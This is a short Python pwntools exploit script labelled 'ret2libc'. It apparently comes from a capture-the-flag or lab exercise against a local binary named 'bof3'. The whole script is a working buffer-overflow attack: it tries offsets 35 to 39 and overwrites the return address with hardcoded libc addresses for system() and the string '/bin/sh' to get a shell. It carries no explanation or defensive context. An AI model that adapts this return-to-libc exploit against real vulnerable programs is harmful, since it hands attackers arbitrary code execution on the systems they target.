from pwn import *
import struct

"""
ret2libc

"""


system_address = struct.pack("I",0xf7e12420)
system_binsh = struct.pack("I",0xf7f5c352)


for x in range(35,40):
	p = process("./bof3")

	payload = b'a'*x
	payload += system_address
	payload += b"BBBB"
	payload += system_binsh

	p.sendline(payload)

	res = p.recvall().decode()
	print("current offset %s" %(x) )
	print(res)
	print(payload)
	p.close()